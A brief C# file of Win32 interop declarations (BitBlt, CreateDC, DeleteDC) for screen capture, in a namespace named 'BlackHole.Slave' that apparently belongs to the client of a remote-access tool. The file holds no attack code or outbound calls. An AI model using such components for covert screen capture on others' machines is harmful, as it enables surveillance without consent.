using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave
{
    public static class Win32
    {
        public const int ROP_COPY = 0x00CC0020;

        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BitBlt(
            [In] IntPtr hdc,
            int xDest,
            int yDest,
            int width,
            int height, 
            [In]
            IntPtr hdcSrc, 
            int xSrc, 
            int ySrc, 
            int rop);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateDC(
            string driver,
            string device, 
            string output,
            IntPtr initData);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(
            [In]
            IntPtr hdc);
    }
}
